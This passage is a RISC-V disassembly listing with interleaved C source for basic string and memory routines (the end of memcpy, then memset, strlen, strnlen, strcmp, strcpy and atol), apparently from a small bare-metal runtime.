    800024f2:	fd043783          	ld	a5,-48(s0)
    800024f6:	00178693          	addi	a3,a5,1
    800024fa:	fcd43823          	sd	a3,-48(s0)
    800024fe:	00074703          	lbu	a4,0(a4)
    80002502:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    80002506:	fc843703          	ld	a4,-56(s0)
    8000250a:	fb843783          	ld	a5,-72(s0)
    8000250e:	97ba                	add	a5,a5,a4
    80002510:	fd043703          	ld	a4,-48(s0)
    80002514:	fcf769e3          	bltu	a4,a5,800024e6 <memcpy+0x7a>
  }
  return dest;
    80002518:	fc843783          	ld	a5,-56(s0)
}
    8000251c:	853e                	mv	a0,a5
    8000251e:	6426                	ld	s0,72(sp)
    80002520:	6161                	addi	sp,sp,80
    80002522:	8082                	ret

0000000080002524 <memset>:

void* memset(void* dest, int byte, size_t len)
{
    80002524:	715d                	addi	sp,sp,-80
    80002526:	e4a2                	sd	s0,72(sp)
    80002528:	0880                	addi	s0,sp,80
    8000252a:	fca43423          	sd	a0,-56(s0)
    8000252e:	87ae                	mv	a5,a1
    80002530:	fac43c23          	sd	a2,-72(s0)
    80002534:	fcf42223          	sw	a5,-60(s0)
  if ((((uintptr_t)dest | len) & (sizeof(uintptr_t)-1)) == 0) {
    80002538:	fc843703          	ld	a4,-56(s0)
    8000253c:	fb843783          	ld	a5,-72(s0)
    80002540:	8fd9                	or	a5,a5,a4
    80002542:	8b9d                	andi	a5,a5,7
    80002544:	e7bd                	bnez	a5,800025b2 <memset+0x8e>
    uintptr_t word = byte & 0xFF;
    80002546:	fc442783          	lw	a5,-60(s0)
    8000254a:	0ff7f793          	andi	a5,a5,255
    8000254e:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 8;
    80002552:	fd843783          	ld	a5,-40(s0)
    80002556:	07a2                	slli	a5,a5,0x8
    80002558:	fd843703          	ld	a4,-40(s0)
    8000255c:	8fd9                	or	a5,a5,a4
    8000255e:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16;
    80002562:	fd843783          	ld	a5,-40(s0)
    80002566:	07c2                	slli	a5,a5,0x10
    80002568:	fd843703          	ld	a4,-40(s0)
    8000256c:	8fd9                	or	a5,a5,a4
    8000256e:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16 << 16;
    80002572:	fd843783          	ld	a5,-40(s0)
    80002576:	1782                	slli	a5,a5,0x20
    80002578:	fd843703          	ld	a4,-40(s0)
    8000257c:	8fd9                	or	a5,a5,a4
    8000257e:	fcf43c23          	sd	a5,-40(s0)

    uintptr_t *d = dest;
    80002582:	fc843783          	ld	a5,-56(s0)
    80002586:	fef43423          	sd	a5,-24(s0)
    while (d < (uintptr_t*)(dest + len))
    8000258a:	a811                	j	8000259e <memset+0x7a>
      *d++ = word;
    8000258c:	fe843783          	ld	a5,-24(s0)
    80002590:	00878713          	addi	a4,a5,8
    80002594:	fee43423          	sd	a4,-24(s0)
    80002598:	fd843703          	ld	a4,-40(s0)
    8000259c:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    8000259e:	fc843703          	ld	a4,-56(s0)
    800025a2:	fb843783          	ld	a5,-72(s0)
    800025a6:	97ba                	add	a5,a5,a4
    800025a8:	fe843703          	ld	a4,-24(s0)
    800025ac:	fef760e3          	bltu	a4,a5,8000258c <memset+0x68>
    800025b0:	a81d                	j	800025e6 <memset+0xc2>
  } else {
    char *d = dest;
    800025b2:	fc843783          	ld	a5,-56(s0)
    800025b6:	fef43023          	sd	a5,-32(s0)
    while (d < (char*)(dest + len))
    800025ba:	a829                	j	800025d4 <memset+0xb0>
      *d++ = byte;
    800025bc:	fe043783          	ld	a5,-32(s0)
    800025c0:	00178713          	addi	a4,a5,1
    800025c4:	fee43023          	sd	a4,-32(s0)
    800025c8:	fc442703          	lw	a4,-60(s0)
    800025cc:	0ff77713          	andi	a4,a4,255
    800025d0:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    800025d4:	fc843703          	ld	a4,-56(s0)
    800025d8:	fb843783          	ld	a5,-72(s0)
    800025dc:	97ba                	add	a5,a5,a4
    800025de:	fe043703          	ld	a4,-32(s0)
    800025e2:	fcf76de3          	bltu	a4,a5,800025bc <memset+0x98>
  }
  return dest;
    800025e6:	fc843783          	ld	a5,-56(s0)
}
    800025ea:	853e                	mv	a0,a5
    800025ec:	6426                	ld	s0,72(sp)
    800025ee:	6161                	addi	sp,sp,80
    800025f0:	8082                	ret

00000000800025f2 <strlen>:

size_t strlen(const char *s)
{
    800025f2:	7179                	addi	sp,sp,-48
    800025f4:	f422                	sd	s0,40(sp)
    800025f6:	1800                	addi	s0,sp,48
    800025f8:	fca43c23          	sd	a0,-40(s0)
  const char *p = s;
    800025fc:	fd843783          	ld	a5,-40(s0)
    80002600:	fef43423          	sd	a5,-24(s0)
  while (*p)
    80002604:	a031                	j	80002610 <strlen+0x1e>
    p++;
    80002606:	fe843783          	ld	a5,-24(s0)
    8000260a:	0785                	addi	a5,a5,1
    8000260c:	fef43423          	sd	a5,-24(s0)
  while (*p)
    80002610:	fe843783          	ld	a5,-24(s0)
    80002614:	0007c783          	lbu	a5,0(a5)
    80002618:	f7fd                	bnez	a5,80002606 <strlen+0x14>
  return p - s;
    8000261a:	fe843703          	ld	a4,-24(s0)
    8000261e:	fd843783          	ld	a5,-40(s0)
    80002622:	40f707b3          	sub	a5,a4,a5
}
    80002626:	853e                	mv	a0,a5
    80002628:	7422                	ld	s0,40(sp)
    8000262a:	6145                	addi	sp,sp,48
    8000262c:	8082                	ret

000000008000262e <strnlen>:

size_t strnlen(const char *s, size_t n)
{
    8000262e:	7179                	addi	sp,sp,-48
    80002630:	f422                	sd	s0,40(sp)
    80002632:	1800                	addi	s0,sp,48
    80002634:	fca43c23          	sd	a0,-40(s0)
    80002638:	fcb43823          	sd	a1,-48(s0)
  const char *p = s;
    8000263c:	fd843783          	ld	a5,-40(s0)
    80002640:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    80002644:	a031                	j	80002650 <strnlen+0x22>
    p++;
    80002646:	fe843783          	ld	a5,-24(s0)
    8000264a:	0785                	addi	a5,a5,1
    8000264c:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    80002650:	fd043783          	ld	a5,-48(s0)
    80002654:	fff78713          	addi	a4,a5,-1
    80002658:	fce43823          	sd	a4,-48(s0)
    8000265c:	c791                	beqz	a5,80002668 <strnlen+0x3a>
    8000265e:	fe843783          	ld	a5,-24(s0)
    80002662:	0007c783          	lbu	a5,0(a5)
    80002666:	f3e5                	bnez	a5,80002646 <strnlen+0x18>
  return p - s;
    80002668:	fe843703          	ld	a4,-24(s0)
    8000266c:	fd843783          	ld	a5,-40(s0)
    80002670:	40f707b3          	sub	a5,a4,a5
}
    80002674:	853e                	mv	a0,a5
    80002676:	7422                	ld	s0,40(sp)
    80002678:	6145                	addi	sp,sp,48
    8000267a:	8082                	ret

000000008000267c <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    8000267c:	7179                	addi	sp,sp,-48
    8000267e:	f422                	sd	s0,40(sp)
    80002680:	1800                	addi	s0,sp,48
    80002682:	fca43c23          	sd	a0,-40(s0)
    80002686:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    8000268a:	fd843783          	ld	a5,-40(s0)
    8000268e:	00178713          	addi	a4,a5,1
    80002692:	fce43c23          	sd	a4,-40(s0)
    80002696:	0007c783          	lbu	a5,0(a5)
    8000269a:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    8000269e:	fd043783          	ld	a5,-48(s0)
    800026a2:	00178713          	addi	a4,a5,1
    800026a6:	fce43823          	sd	a4,-48(s0)
    800026aa:	0007c783          	lbu	a5,0(a5)
    800026ae:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    800026b2:	fef44783          	lbu	a5,-17(s0)
    800026b6:	0ff7f793          	andi	a5,a5,255
    800026ba:	cb99                	beqz	a5,800026d0 <strcmp+0x54>
    800026bc:	fef44703          	lbu	a4,-17(s0)
    800026c0:	fee44783          	lbu	a5,-18(s0)
    800026c4:	0ff77713          	andi	a4,a4,255
    800026c8:	0ff7f793          	andi	a5,a5,255
    800026cc:	faf70fe3          	beq	a4,a5,8000268a <strcmp+0xe>

  return c1 - c2;
    800026d0:	fef44783          	lbu	a5,-17(s0)
    800026d4:	0007871b          	sext.w	a4,a5
    800026d8:	fee44783          	lbu	a5,-18(s0)
    800026dc:	2781                	sext.w	a5,a5
    800026de:	40f707bb          	subw	a5,a4,a5
    800026e2:	2781                	sext.w	a5,a5
}
    800026e4:	853e                	mv	a0,a5
    800026e6:	7422                	ld	s0,40(sp)
    800026e8:	6145                	addi	sp,sp,48
    800026ea:	8082                	ret

00000000800026ec <strcpy>:

char* strcpy(char* dest, const char* src)
{
    800026ec:	7179                	addi	sp,sp,-48
    800026ee:	f422                	sd	s0,40(sp)
    800026f0:	1800                	addi	s0,sp,48
    800026f2:	fca43c23          	sd	a0,-40(s0)
    800026f6:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    800026fa:	fd843783          	ld	a5,-40(s0)
    800026fe:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    80002702:	0001                	nop
    80002704:	fd043703          	ld	a4,-48(s0)
    80002708:	00170793          	addi	a5,a4,1
    8000270c:	fcf43823          	sd	a5,-48(s0)
    80002710:	fe843783          	ld	a5,-24(s0)
    80002714:	00178693          	addi	a3,a5,1
    80002718:	fed43423          	sd	a3,-24(s0)
    8000271c:	00074703          	lbu	a4,0(a4)
    80002720:	00e78023          	sb	a4,0(a5)
    80002724:	0007c783          	lbu	a5,0(a5)
    80002728:	fff1                	bnez	a5,80002704 <strcpy+0x18>
    ;
  return dest;
    8000272a:	fd843783          	ld	a5,-40(s0)
}
    8000272e:	853e                	mv	a0,a5
    80002730:	7422                	ld	s0,40(sp)
    80002732:	6145                	addi	sp,sp,48
    80002734:	8082                	ret

0000000080002736 <atol>:

long atol(const char* str)
{
    80002736:	7179                	addi	sp,sp,-48
    80002738:	f422                	sd	s0,40(sp)
    8000273a:	1800                	addi	s0,sp,48
    8000273c:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    80002740:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    80002744:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    80002748:	a031                	j	80002754 <atol+0x1e>
    str++;
    8000274a:	fd843783          	ld	a5,-40(s0)
    8000274e:	0785                	addi	a5,a5,1
    80002750:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    80002754:	fd843783          	ld	a5,-40(s0)
    80002758:	0007c783          	lbu	a5,0(a5)
    8000275c:	873e                	mv	a4,a5
    8000275e:	02000793          	li	a5,32
    80002762:	fef704e3          	beq	a4,a5,8000274a <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002766:	fd843783          	ld	a5,-40(s0)
    8000276a:	0007c783          	lbu	a5,0(a5)
    8000276e:	873e                	mv	a4,a5
    80002770:	02d00793          	li	a5,45
    80002774:	00f70b63          	beq	a4,a5,8000278a <atol+0x54>
    80002778:	fd843783          	ld	a5,-40(s0)
    8000277c:	0007c783          	lbu	a5,0(a5)
    80002780:	873e                	mv	a4,a5
    80002782:	02b00793          	li	a5,43
    80002786:	06f71263          	bne	a4,a5,800027ea <atol+0xb4>
    sign = *str == '-';
    8000278a:	fd843783          	ld	a5,-40(s0)
    8000278e:	0007c783          	lbu	a5,0(a5)
    80002792:	0007871b          	sext.w	a4,a5
    80002796:	02d00793          	li	a5,45
    8000279a:	40f707b3          	sub	a5,a4,a5
    8000279e:	0017b793          	seqz	a5,a5
    800027a2:	0ff7f793          	andi	a5,a5,255
    800027a6:	fef42223          	sw	a5,-28(s0)
    str++;
    800027aa:	fd843783          	ld	a5,-40(s0)
    800027ae:	0785                	addi	a5,a5,1
    800027b0:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    800027b4:	a81d                	j	800027ea <atol+0xb4>
    res *= 10;
    800027b6:	fe843703          	ld	a4,-24(s0)
    800027ba:	87ba                	mv	a5,a4
    800027bc:	078a                	slli	a5,a5,0x2
    800027be:	97ba                	add	a5,a5,a4
    800027c0:	0786                	slli	a5,a5,0x1
    800027c2:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    800027c6:	fd843783          	ld	a5,-40(s0)
    800027ca:	00178713          	addi	a4,a5,1
    800027ce:	fce43c23          	sd	a4,-40(s0)
    800027d2:	0007c783          	lbu	a5,0(a5)
    800027d6:	2781                	sext.w	a5,a5
    800027d8:	fd07879b          	addiw	a5,a5,-48
    800027dc:	2781                	sext.w	a5,a5
    800027de:	873e                	mv	a4,a5
    800027e0:	fe843783          	ld	a5,-24(s0)
    800027e4:	97ba                	add	a5,a5,a4
    800027e6:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    800027ea:	fd843783          	ld	a5,-40(s0)
    800027ee:	0007c783          	lbu	a5,0(a5)
    800027f2:	f3f1                	bnez	a5,800027b6 <atol+0x80>
  }

  return sign ? -res : res;
    800027f4:	fe442783          	lw	a5,-28(s0)
    800027f8:	2781                	sext.w	a5,a5
    800027fa:	c791                	beqz	a5,80002806 <atol+0xd0>
    800027fc:	fe843783          	ld	a5,-24(s0)
    80002800:	40f007b3          	neg	a5,a5
    80002804:	a019                	j	8000280a <atol+0xd4>
    80002806:	fe843783          	ld	a5,-24(s0)
}
    8000280a:	853e                	mv	a0,a5
    8000280c:	7422                	ld	s0,40(sp)
    8000280e:	6145                	addi	sp,sp,48
    80002810:	8082                	ret
